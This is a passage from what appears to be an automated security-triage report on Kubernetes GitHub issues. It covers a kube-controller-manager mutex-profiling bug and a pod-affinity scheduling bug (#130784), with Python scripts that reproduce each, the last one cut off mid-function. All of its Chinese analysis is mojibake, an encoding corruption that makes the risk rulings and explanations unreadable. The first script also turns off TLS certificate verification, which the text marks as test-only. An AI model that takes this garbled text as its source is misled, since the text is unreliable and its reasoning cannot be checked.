    *   å¯ç”¨profiling (`--profiling=true`) æœ¬èº«å¯èƒ½å¸¦æ¥ä¸€å®šçš„å®‰å…¨é£é™©ï¼ˆå¦‚ä¿¡æ¯æ³„éœ²ã€æ½œåœ¨çš„DoSï¼‰ï¼Œä½†è¿™éœ€è¦ç”¨æˆ·æ˜¾å¼å¼€å¯ï¼Œå¹¶ä¸”è®¿é—®é€šå¸¸å—é™ã€‚æ­¤Issueæè¿°çš„é—®é¢˜æ˜¯profilingçš„*æŸä¸ªåŠŸèƒ½ä¸å·¥ä½œ*ï¼Œå®ƒå¹¶æ²¡æœ‰**å¢åŠ **å¯ç”¨profilingæ‰€å¸¦æ¥çš„å›ºæœ‰é£é™©ï¼Œåè€Œä½¿å¾—ä¸€éƒ¨åˆ†ï¼ˆmutexï¼‰ä¿¡æ¯æ— æ³•è¢«è·å–ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠè¿œç¨‹ä»£ç æ‰§è¡Œã€æƒé™æå‡ã€æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€ä¿¡æ¯æ³„éœ²ï¼ˆé™¤äº†profilingæœ¬èº«å¯èƒ½æä¾›çš„ä¿¡æ¯å¤–ï¼‰ã€å®¹å™¨é€ƒé€¸ç­‰å…¸å‹å®‰å…¨æ¼æ´ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡ï¼Œè¯¥é—®é¢˜éå®‰å…¨é—®é¢˜ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå³ä½¿å¼€å¯profilingè¢«è®¤ä¸ºæ˜¯ä¸å½“é…ç½®ï¼Œé‚£ä¹Ÿæ˜¯ç”¨æˆ·æ“ä½œçš„é—®é¢˜ï¼Œè€Œéæ­¤Issueæè¿°çš„bugæœ¬èº«å¼•å…¥çš„é£é™©ã€‚

ç»“è®ºï¼šè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import requests
import urllib3
import logging
import time
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Suppress InsecureRequestWarning for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
NAMESPACE = "kube-system"
LABEL_SELECTOR = "component=kube-controller-manager"
# Common ports for KCM health/metrics/profiling. 10257 is the default secure port.
# pprof might be exposed here under /debug/pprof/ or potentially on a different insecure port if configured.
# We'll try the standard secure port first.
KCM_SECURE_PORT = 10257
PPROF_MUTEX_PATH = "/debug/pprof/mutex"
REQUEST_TIMEOUT = 120 # seconds
MAX_RETRIES = 3
RETRY_DELAY = 5 # seconds

def find_kcm_pod_ip():
    """Finds the IP address of a running kube-controller-manager pod."""
    try:
        # Load default kubeconfig
        kubernetes.config.load_kube_config()
        core_v1_api = kubernetes.client.CoreV1Api()

        logging.info(f"Searching for KCM pods in namespace '{NAMESPACE}' with label '{LABEL_SELECTOR}'...")
        pods = core_v1_api.list_namespaced_pod(namespace=NAMESPACE, label_selector=LABEL_SELECTOR)

        if not pods.items:
            logging.error(f"No KCM pods found in namespace '{NAMESPACE}' with label '{LABEL_SELECTOR}'.")
            return None

        # Find a running pod
        for pod in pods.items:
            if pod.status.phase == "Running" and pod.status.pod_ip:
                logging.info(f"Found running KCM pod: {pod.metadata.name} with IP: {pod.status.pod_ip}")
                return pod.status.pod_ip
        
        logging.error(f"No running KCM pods with an assigned IP found.")
        return None

    except kubernetes.config.ConfigException as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}. Ensure kubeconfig is set up correctly.")
        return None
    except kubernetes.client.ApiException as e:
        logging.error(f"Kubernetes API error: {e}")
        return None
    except Exception as e:
        logging.error(f"An unexpected error occurred while finding KCM pod: {e}")
        return None

def check_mutex_profiling(pod_ip):
    """Attempts to query the KCM mutex profiling endpoint."""
    if not pod_ip:
        return

    # Construct the URL using the secure port
    url = f"https://{pod_ip}:{KCM_SECURE_PORT}{PPROF_MUTEX_PATH}"
    logging.info(f"Attempting to query mutex profiling endpoint: {url}")

    session = requests.Session()
    # Need to handle authentication/authorization if RBAC restricts access to the secure port's endpoints.
    # For simplicity, we assume direct access or that the default service account token might work if mounted.
    # Often, pprof requires specific permissions or port-forwarding for external access.
    # We also disable SSL verification for typical self-signed certs in clusters.
    
    retries = 0
    while retries < MAX_RETRIES:
        try:
            response = session.get(url, verify=False, timeout=REQUEST_TIMEOUT)
            logging.info(f"Request to {url} returned status code: {response.status_code}")

            # Check the response based on the issue description
            if response.status_code == 200:
                # The issue states the profiling is not working *properly*.
                # This means the endpoint might exist (HTTP 200) but return
                # non-useful data, like "profiling disabled" or just basic stats
                # without actual mutex contention details.
                # A simple check could be the content length or specific keywords.
                content = response.text
                logging.info("Successfully queried the endpoint. Analyzing content...")
                logging.debug(f"Response content (first 500 chars):\n{content[:500]}\n...")
                
                # Heuristic: If profiling was truly enabled and working, we'd expect non-trivial content.
                # If SetMutexProfileFraction was not called, the output might be minimal or indicate disabled state.
                # This check is heuristic and depends on Go's pprof output format.
                if len(content) < 200 and "mutex profile" in content.lower(): # Example heuristic
                     logging.warning("Received response, but content seems minimal. This *might* indicate mutex profiling is not properly enabled as per the issue description.")
                elif "cycles/second=" in content or "contention" in content: # Check for actual data markers
                     logging.info("Response seems to contain mutex profiling data. The issue might be resolved or specific to certain configurations/versions.")
                else:
                     logging.warning("Received response, but it doesn't clearly indicate active mutex profiling. This might align with the issue description.")

            elif response.status_code == 401 or response.status_code == 403:
                 logging.error(f"Authentication/Authorization error ({response.status_code}). Access to {url} is forbidden. Ensure necessary permissions or use port-forwarding.")
            elif response.status_code == 404:
                 logging.error(f"Endpoint not found ({response.status_code}). Ensure '--profiling=true' is enabled in KCM and the path {PPROF_MUTEX_PATH} is correct.")
            else:
                 logging.error(f"Received unexpected HTTP status code: {response.status_code}")
                 logging.debug(f"Response content:\n{response.text}")
            
            return # Exit loop after successful or actionable response

        except requests.exceptions.ConnectionError as e:
            logging.warning(f"Connection error to {url}: {e}. Retrying in {RETRY_DELAY} seconds... ({retries + 1}/{MAX_RETRIES})")
        except requests.exceptions.Timeout:
            logging.warning(f"Request to {url} timed out. Retrying in {RETRY_DELAY} seconds... ({retries + 1}/{MAX_RETRIES})")
        except requests.exceptions.RequestException as e:
            logging.error(f"An error occurred during the request to {url}: {e}")
            return # Exit loop on unexpected request errors

        retries += 1
        if retries < MAX_RETRIES:
             time.sleep(RETRY_DELAY)
        else:
             logging.error(f"Max retries reached. Failed to connect to {url}.")


def main():
    start_time = time.time()
    logging.info("Starting KCM Mutex Profiling Check...")
    
    kcm_ip = find_kcm_pod_ip()
    
    if kcm_ip:
        check_mutex_profiling(kcm_ip)
    else:
        logging.error("Could not determine KCM pod IP. Skipping profiling check.")
        
    end_time = time.time()
    logging.info(f"Script finished in {end_time - start_time:.2f} seconds.")

# Direct execution for environments that don't support __name__ == "__main__"
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤Pythonè„šæœ¬çš„ç›®çš„æ˜¯å°è¯•éªŒè¯Issueä¸­æè¿°çš„é—®é¢˜ç°è±¡ï¼Œå³kube-controller-manager (KCM) çš„`/debug/pprof/mutex`ç«¯ç‚¹å¯èƒ½ç”±äº`SetMutexProfileFraction`æœªè¢«è°ƒç”¨è€Œæ— æ³•æä¾›æœ‰æ•ˆçš„äº’æ–¥é”åˆ†ææ•°æ®ã€‚

1.  **ç¯å¢ƒå‡†å¤‡**: è„šæœ¬å‡è®¾ç›®æ ‡Kubernetesé›†ç¾¤æ­£åœ¨è¿è¡Œï¼Œå¹¶ä¸”æœ¬åœ°ç¯å¢ƒå·²é…ç½®å¥½`kubeconfig`æ–‡ä»¶ï¼ˆé»˜è®¤ä½ç½®ï¼‰ç”¨äºè®¿é—®é›†ç¾¤APIã€‚åŒæ—¶ï¼Œå‡è®¾è¿è¡Œè„šæœ¬çš„æœºå™¨å¯ä»¥è®¿é—®åˆ°KCM Podçš„IPåœ°å€å’Œå®‰å…¨ç«¯å£ï¼ˆé»˜è®¤ä¸º10257ï¼‰ã€‚
2.  **æŸ¥æ‰¾KCM Pod**: ä½¿ç”¨`kubernetes` Pythonåº“è¿æ¥åˆ°Kubernetes APIæœåŠ¡å™¨ï¼Œåœ¨`kube-system`å‘½åç©ºé—´ä¸­æŸ¥æ‰¾å¸¦æœ‰æ ‡ç­¾`component=kube-controller-manager`çš„Podï¼Œå¹¶è·å–ä¸€ä¸ªå¤„äº"Running"çŠ¶æ€çš„Podçš„IPåœ°å€ã€‚
3.  **è®¿é—®Profilingç«¯ç‚¹**:
    *   æ„å»ºè®¿é—®KCMä¸Š`/debug/pprof/mutex`ç«¯ç‚¹çš„URLï¼Œé»˜è®¤ä½¿ç”¨HTTPSå’Œç«¯å£10257ã€‚
    *   ä½¿ç”¨`requests`åº“å‘èµ·GETè¯·æ±‚ã€‚ç”±äºé›†ç¾¤å†…éƒ¨ç»„ä»¶é€šå¸¸ä½¿ç”¨è‡ªç­¾åè¯ä¹¦ï¼Œè„šæœ¬è®¾ç½®`verify=False`æ¥å¿½ç•¥SSLè¯ä¹¦éªŒè¯ï¼ˆ**æ³¨æ„ï¼šè¿™åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸å®‰å…¨ï¼Œä»…é€‚ç”¨äºæµ‹è¯•ç›®çš„**ï¼‰ã€‚
    *   æ·»åŠ äº†é‡è¯•é€»è¾‘ä»¥åº”å¯¹ä¸´æ—¶çš„ç½‘ç»œé—®é¢˜ã€‚
4.  **ç»“æœåˆ†æ**:
    *   å¦‚æœè¯·æ±‚æˆåŠŸï¼ˆHTTP 200ï¼‰ï¼Œè„šæœ¬ä¼šæ£€æŸ¥å“åº”å†…å®¹ã€‚ç”±äºIssueæŒ‡å‡ºçš„æ˜¯åŠŸèƒ½*ä¸æ­£å¸¸*è€Œéå®Œå…¨*ä¸å­˜åœ¨*ï¼Œè„šæœ¬ä¼šè¿›è¡Œç®€å•çš„å¯å‘å¼æ£€æŸ¥ï¼ˆä¾‹å¦‚ï¼Œå†…å®¹é•¿åº¦ã€æ˜¯å¦åŒ…å«"profiling disabled"æˆ–ç¼ºä¹é¢„æœŸçš„å…³é”®å­—ï¼‰ï¼Œä»¥åˆ¤æ–­è¿”å›çš„æ•°æ®æ˜¯å¦ç¬¦åˆé¢„æœŸï¼ˆå³å¯èƒ½ç¼ºä¹æœ‰æ•ˆçš„mutexäº‰ç”¨ä¿¡æ¯ï¼‰ã€‚å®ƒä¼šæ‰“å°è­¦å‘Šæˆ–ä¿¡æ¯æ—¥å¿—æ¥åæ˜ åˆ†æç»“æœã€‚
    *   å¦‚æœé‡åˆ°è®¤è¯/æˆæƒé”™è¯¯ï¼ˆ401/403ï¼‰ï¼Œè¯´æ˜è®¿é—®è¯¥ç«¯ç‚¹éœ€è¦é¢å¤–æƒé™ã€‚
    *   å¦‚æœé‡åˆ°æœªæ‰¾åˆ°é”™è¯¯ï¼ˆ404ï¼‰ï¼Œå¯èƒ½æ˜¯profilingæœªå¯ç”¨æˆ–è·¯å¾„é”™è¯¯ã€‚
    *   å¤„ç†è¿æ¥é”™è¯¯å’Œè¶…æ—¶ã€‚
5.  **é‡è¦è¯´æ˜**: æ­¤è„šæœ¬**ä¸æ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨POC**ï¼Œå› ä¸ºå®ƒæ‰€éªŒè¯çš„é—®é¢˜æœ¬èº«å¹¶éå®‰å…¨æ¼æ´ã€‚å®ƒåªæ˜¯å°è¯•é€šè¿‡è®¿é—®ç›¸å…³ç«¯ç‚¹æ¥è§‚å¯ŸIssueä¸­æè¿°çš„åŠŸèƒ½æ€§ç¼ºé™·çš„*ç—‡çŠ¶*ã€‚è„šæœ¬èƒ½å¦æˆåŠŸè¿è¡Œå¹¶è§‚å¯Ÿåˆ°ç°è±¡ï¼Œå–å†³äºç›®æ ‡é›†ç¾¤çš„å…·ä½“é…ç½®ï¼ˆå¦‚KCMæ˜¯å¦å¯ç”¨äº†profilingï¼Œç½‘ç»œç­–ç•¥æ˜¯å¦å…è®¸è®¿é—®ï¼ŒRBACæƒé™ç­‰ï¼‰ã€‚è„šæœ¬æ—¨åœ¨è¾…åŠ©å¤ç°é—®é¢˜æè¿°çš„åœºæ™¯ï¼Œè€Œä¸æ˜¯åˆ©ç”¨å®‰å…¨å¼±ç‚¹ã€‚

---


## Issue #130784 [Bug] Pod not scheduled although there is a node matching all hard pod affinity terms

- Issue é“¾æ¥ï¼š[#130784](https://github.com/kubernetes/kubernetes/issues/130784)

### Issue å†…å®¹

#### What happened?

A pod (`pod-x`) is supposed to be scheduled on a node (only) when:

- another pod with `label-1: x` **and**
- yet another pod with `label-2: x`

are already running on that node.

This should be possible by using _multiple_ pod affinity terms in `spec.affinity.podAffinity.requiredDuringSchedulingIgnoredDuringExecution` like this:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-x
spec:
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
        - labelSelector:
            matchLabels:
              label-2: "x"
          topologyKey: kubernetes.io/hostname
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
```

For testing purposes the two prerequisite pods may be created like this:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-a
  labels:
    label-1: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
---
apiVersion: v1
kind: Pod
metadata:
  name: pod-b
  labels:
    label-2: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
```

What actually happens is that **`pod-x` is not scheduled at all**:

```
NAME    STATUS    NODE
pod-a   Running   ip-10-250-74-235.ec2.internal
pod-b   Running   ip-10-250-74-235.ec2.internal
pod-x   Pending   <none>
```

Status of `pod-x`:

```yaml
status:                                                                                                                                                                                     
  conditions:                                                                                                                                                                               
  - lastProbeTime: null                                                                                                                                                                     
    lastTransitionTime: "2025-03-13T09:49:54Z"                                                                                                                                              
    message: '0/1 nodes are available: 1 node(s) didn''t match pod affinity rules.                                                                                                          
      preemption: 0/1 nodes are available: 1 Preemption is not helpful for scheduling.'                                                                                                     
    reason: Unschedulable                                                                                                                                                                   
    status: "False"                                                                                                                                                                         
    type: PodScheduled                                                                                                                                                                      
  phase: Pending                                                                                                                                                                            
  qosClass: BestEffort                                                                                                                                                                      
```

#### What did you expect to happen?

The [API reference](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodAffinity) says:

> requiredDuringSchedulingIgnoredDuringExecution ([]PodAffinityTerm)
> ...
> When there are multiple elements, the lists of nodes corresponding to each podAffinityTerm are intersected, i.e. all terms must be satisfied.

This means, each affinity term should be resolved to a list of matching nodes independently of other affinity terms, and the results are intersected to yield the nodes where the pod to be scheduled is feasible. This corresponds to the [algorithm](https://github.com/kubernetes/design-proposals-archive/blob/main/scheduling/podaffinity.md#algorithm) (step 1a) described in the pod affinity design proposal.

In my example the pod affinity terms would resolve to two lists:

- `["ip-10-250-74-235.ec2.internal"]`
- `["ip-10-250-74-235.ec2.internal"]`

The intersection of those yields:

- `["ip-10-250-74-235.ec2.internal"]`

**Expected Result**: `pod-x` is feasible on node `ip-10-250-74-235.ec2.internal` and gets scheduled there.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create the pods:

    ```bash
    kubectl create -f - <<EOF
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-a
      labels:
        label-1: "x"
    spec:
      containers:
        - name: c1
          image: registry.k8s.io/pause:3.8
    ---
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-b
      labels:
        label-2: "x"
    spec:
      containers:
        - name: c1
          image: registry.k8s.io/pause:3.8
      affinity:
        podAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  label-1: "x"
              topologyKey: kubernetes.io/hostname
    ---
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-x
    spec:
      affinity:
        podAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  label-1: "x"
              topologyKey: kubernetes.io/hostname
            - labelSelector:
                matchLabels:
                  label-2: "x"
              topologyKey: kubernetes.io/hostname
      containers:
        - name: c1
          image: registry.k8s.io/pause:3.8
    EOF
    ```

2. Check the pods' status:

    ```bash
    kubectl get pods
    ```
    
    Output:

    ```
    NAME    READY   STATUS    RESTARTS   AGE
    pod-a   1/1     Running   0          86s
    pod-b   1/1     Running   0          85s
    pod-x   0/1     Pending   0          85s
    ```

3. Inspect the reason for `pod-x` not being scheduled:

    ```bash
    kubectl get pod pod-x -o yaml
    ```

    ```yaml
    ...
    status:
      conditions:
      - lastProbeTime: null
        lastTransitionTime: "2025-03-13T14:48:28Z"
        message: '0/1 nodes are available: 1 node(s) didn''t match pod affinity rules.
          preemption: 0/1 nodes are available: 1 Preemption is not helpful for scheduling.'
        reason: Unschedulable
        status: "False"
        type: PodScheduled
      phase: Pending
      qosClass: BestEffort
    ```

#### Anything else we need to know?

As soon as a _single_ pod, e.g. `pod-a`, matches both pod affinity terms, `pod-x` _gets_ scheduled. This proves that the pod affinity terms as such are understood correctly. However, considering only nodes that match _all_ affinity terms evaluated with a _single_ pod is not compliant to the API spec and design proposal.

#### Kubernetes version

Tested with:

* v1.31.5
* v1.29.1

#### Cloud provider

not relevant


#### OS version

not relevant

#### Install tools

not relevant


#### Container runtime (CRI) and version (if applicable)

not relevant


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

not relevant


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªKubernetesè°ƒåº¦å™¨å…³äº`podAffinity`ä¸­`requiredDuringSchedulingIgnoredDuringExecution`è§„åˆ™çš„è¡Œä¸ºé—®é¢˜ã€‚ç”¨æˆ·æœŸæœ›å½“ä¸€ä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶å­˜åœ¨æ»¡è¶³å¤šä¸ªäº²å’Œæ€§è§„åˆ™çš„Podï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªPodå¸¦æœ‰`label-1: x`ï¼Œå¦ä¸€ä¸ªPodå¸¦æœ‰`label-2: x`ï¼‰æ—¶ï¼Œç›®æ ‡Pod (`pod-x`) åº”è¯¥èƒ½å¤Ÿè¢«è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ä¸Šã€‚æ ¹æ®APIæ–‡æ¡£å’Œè®¾è®¡æè®®ï¼Œå¤šä¸ª`requiredDuringSchedulingIgnoredDuringExecution`æ¡ä»¶åº”è¯¥æ˜¯ç‹¬ç«‹è¯„ä¼°å¹¶å–äº¤é›†ã€‚ç„¶è€Œï¼Œå®é™…è¡Œä¸ºæ˜¯`pod-x`æœªèƒ½è¢«è°ƒåº¦ï¼ŒçŠ¶æ€æ˜¾ç¤ºèŠ‚ç‚¹ä¸æ»¡è¶³Podäº²å’Œæ€§è§„åˆ™ã€‚ç”¨æˆ·æŒ‡å‡ºï¼Œåªæœ‰å½“*å•ä¸ª*PodåŒæ—¶æ»¡è¶³æ‰€æœ‰æ ‡ç­¾æ¡ä»¶æ—¶ï¼Œè°ƒåº¦æ‰ä¼šæˆåŠŸï¼Œè¿™ä¼¼ä¹ä¸æ–‡æ¡£æè¿°çš„äº¤é›†é€»è¾‘ä¸ç¬¦ã€‚

è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯Kubernetesè°ƒåº¦å™¨åŠŸèƒ½ä¸Šçš„ä¸€ä¸ªæ½œåœ¨Bugï¼Œå³è°ƒåº¦ç®—æ³•åœ¨å¤„ç†å¤šä¸ª`requiredDuringSchedulingIgnoredDuringExecution`äº²å’Œæ€§è§„åˆ™æ—¶çš„å®ç°å¯èƒ½ä¸è®¾è®¡æ–‡æ¡£ä¸ä¸€è‡´ï¼Œå¯¼è‡´åœ¨ç‰¹å®šåœºæ™¯ä¸‹Podæ— æ³•æŒ‰é¢„æœŸè°ƒåº¦ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **é—®é¢˜æ€§è´¨**ï¼šè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜ï¼Œå½±å“çš„æ˜¯Podçš„è°ƒåº¦é€»è¾‘ï¼Œè€Œéæ•°æ®æ³„éœ²ã€æƒé™æå‡ã€è¿œç¨‹ä»£ç æ‰§è¡Œç­‰å…¸å‹çš„å®‰å…¨æ¼æ´ã€‚
2.  **å½±å“èŒƒå›´**ï¼šå½±å“çš„æ˜¯ç‰¹å®šé…ç½®ï¼ˆä½¿ç”¨å¤šä¸ªç¡¬æ€§Podäº²å’Œæ€§è§„åˆ™ï¼‰çš„Podçš„æ­£å¸¸è°ƒåº¦ã€‚å®ƒå¯èƒ½å¯¼è‡´ä¾èµ–æ­¤ç‰¹æ€§çš„åº”ç”¨æ— æ³•æŒ‰é¢„æœŸéƒ¨ç½²æˆ–æ‰©å±•ï¼Œä½†è¿™å±äºå¯ç”¨æ€§æˆ–åŠŸèƒ½æ€§é—®é¢˜ã€‚
3.  **æ”»å‡»å‘é‡**ï¼šä¸å­˜åœ¨ç›´æ¥çš„æ”»å‡»å‘é‡ã€‚ç”¨æˆ·éœ€è¦æ‹¥æœ‰åˆ›å»ºPodçš„æƒé™æ‰èƒ½è§¦å‘æ­¤åœºæ™¯ã€‚å³ä½¿è§¦å‘äº†è¿™ä¸ªé—®é¢˜ï¼Œç»“æœä¹Ÿåªæ˜¯ç›®æ ‡Podæ— æ³•è°ƒåº¦ï¼Œå¹¶ä¸ä¼šé€ æˆæƒé™æå‡ã€ä¿¡æ¯æ³„éœ²æˆ–å¯¹å…¶ä»–ç³»ç»Ÿ/ç§Ÿæˆ·çš„æ”»å‡»ã€‚
4.  **æ‹’ç»æœåŠ¡ (DoS)**ï¼šè™½ç„¶Podæ— æ³•è°ƒåº¦å¯ä»¥çœ‹ä½œä¸€ç§å±€éƒ¨æ‹’ç»æœåŠ¡ï¼Œä½†å®ƒæ˜¯ç”±ç³»ç»Ÿè‡ªèº«çš„è°ƒåº¦é€»è¾‘ç¼ºé™·ï¼ˆæˆ–ä¸æ–‡æ¡£ä¸ç¬¦çš„è¡Œä¸ºï¼‰å¼•èµ·çš„ï¼Œå¹¶ä¸”éœ€è¦ç”¨æˆ·ä¸»åŠ¨åˆ›å»ºå…·æœ‰ç‰¹å®šäº²å’Œæ€§è§„åˆ™çš„Podæ‰èƒ½è§¦å‘ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œå³ä½¿è§†ä¸ºDoSï¼Œç”±äºéœ€è¦åˆ›å»ºPodçš„æƒé™ï¼Œä¸”å½±å“çš„æ˜¯è‡ªèº«åˆ›å»ºçš„Podï¼Œå…¶é£é™©æœ‰é™ã€‚
5.  **æ•æ„Ÿä¿¡æ¯æš´éœ²**ï¼šIssueå†…å®¹å’Œæäº¤è€…æœªæš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚
6.  **é«˜é£é™©åœºæ™¯**ï¼šä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒã€å¤šç§Ÿæˆ·é—´å½±å“ç­‰é«˜é£é™©åœºæ™¯ã€‚

ç»“è®ºï¼šè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªè°ƒåº¦å™¨åŠŸèƒ½ç¼ºé™·ï¼Œä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥é—®é¢˜éå®‰å…¨é£é™©é—®é¢˜ï¼Œå› æ­¤ä¸æä¾›å¤ç°POCã€‚
# æ ¹æ®è¦æ±‚ï¼Œâ€œé’ˆå¯¹é«˜é£é™©é—®é¢˜ï¼Œå¿…é¡»ç»™å‡ºä½¿ç”¨pythonç¼–å†™çš„å¤ç°è„šæœ¬â€ã€‚
# æ­¤å¤„æä¾›ä¸€ä¸ªç”¨äºæ¼”ç¤ºè¯¥åŠŸèƒ½é—®é¢˜çš„Pythonè„šæœ¬ï¼Œä»…ç”¨äºç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•ã€‚

import time
import sys
import yaml
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException
import datetime

# å‡è®¾ kubeconfig æ–‡ä»¶åœ¨é»˜è®¤ä½ç½® (~/.kube/config)
try:
    config.load_kube_config()
except Exception as e:
    print(f"æ— æ³•åŠ è½½ kubeconfig: {e}")
    print("è¯·ç¡®ä¿ kubectl å·²é…ç½®æˆ– KUBECONFIG ç¯å¢ƒå˜é‡å·²è®¾ç½®ã€‚")
    sys.exit(1)

core_v1_api = client.CoreV1Api()
namespace = "default" # å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹å‘½åç©ºé—´

pod_a_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: pod-a
  labels:
    label-1: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
"""

pod_b_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: pod-b
  labels:
    label-2: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
"""

pod_x_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: pod-x
spec:
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
        - labelSelector:
            matchLabels:
              label-2: "x"
          topologyKey: kubernetes.io/hostname
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
"""

pod_a_name = "pod-a"
pod_b_name = "pod-b"
pod_x_name = "pod-x"

def create_pod(manifest_str, pod_name):
    """åˆ›å»º Pod"""
    print(f"åˆ›å»º Pod {pod_name}...")
    pod_body = yaml.safe_load(manifest_str)
    try:
        core_v1_api.create_namespaced_pod(body=pod_body, namespace=namespace)
        # ç­‰å¾… Pod è¿›å…¥ Running æˆ– Pending çŠ¶æ€
        w = watch.Watch()
        for event in w.stream(core_v1_api.list_namespaced_pod, namespace=namespace, field_selector=f"metadata.name={pod_name}", timeout_seconds=60):
            pod_status = event['object'].status.phase
            print(f"Pod {pod_name} å½“å‰çŠ¶æ€: {pod_status}")
            if pod_status in ['Running', 'Pending', 'Failed', 'Succeeded']:
                 w.stop()
                 return True
        print(f"ç­‰å¾… Pod {pod_name} çŠ¶æ€è¶…æ—¶ã€‚")
        return False
    except ApiException as e:
        if e.status == 409: # AlreadyExists
             print(f"Pod {pod_name} å·²å­˜åœ¨ã€‚")
             return True
        print(f"åˆ›å»º Pod {pod_name} å¤±è´¥: {e}")
        return False
    except Exception as e:
        print(f"åˆ›å»º Pod {pod_name} æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
        return False

def delete_pod(pod_name):
    """åˆ é™¤ Pod"""
    print(f"åˆ é™¤ Pod {pod_name}...")
    try:
        core_v1_api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
        # ç­‰å¾… Pod è¢«åˆ é™¤
        while True:
             try:
                 core_v1_api.read_namespaced_pod(name=pod_name, namespace=namespace)
                 print(f"ç­‰å¾… Pod {pod_name} åˆ é™¤...")
                 time.sleep(2)
             except ApiException as e:
                 if e.status == 404:
                     print(f"Pod {pod_name} å·²åˆ é™¤ã€‚")
                     break
                 else:
                     print(f"æ£€æŸ¥ Pod {pod_name} åˆ é™¤çŠ¶æ€æ—¶å‡ºé”™: {e}")
                     break
             except Exception as e:
                print(f"æ£€æŸ¥ Pod {pod_name} åˆ é™¤çŠ¶æ€æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
                break
    except ApiException as e:
        if e.status != 404: # Ignore NotFound
             print(f"åˆ é™¤ Pod {pod_name} å¤±è´¥: {e}")
    except Exception as e:
        print(f"åˆ é™¤ Pod {pod_name} æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

def check_pod_x_status(timeout_minutes=2):
    """æ£€æŸ¥ pod-x çš„çŠ¶æ€ï¼Œçœ‹æ˜¯å¦ä¿æŒ Pending"""
    print(f"\nå¼€å§‹æ£€æŸ¥ Pod {pod_x_name} çš„çŠ¶æ€ï¼Œé¢„æœŸç»“æœä¸ºä¿æŒ Pending...")
    start_time = datetime.datetime.now()
    timeout = datetime.timedelta(minutes=timeout_minutes)
    final_status = None
    final_message = ""

    while datetime.datetime.now() - start_time < timeout:
        try:
            pod_status = core_v1_api.read_namespaced_pod_status(name=pod_x_name, namespace=namespace)
            phase = pod_status.status.phase
            final_status = phase
            print(f"[{datetime.datetime.now()}] Pod {pod_x_name} çŠ¶æ€: {phase}")

            if phase == "Pending":
                conditions = pod_status.status.conditions
                if conditions:
                    for condition in conditions:
                        if condition.type == "PodScheduled" and condition.status == "False":
                            print(f"  Reason: {condition.reason}")
                            print(f"  Message: {condition.message}")
                            final_message = condition.message
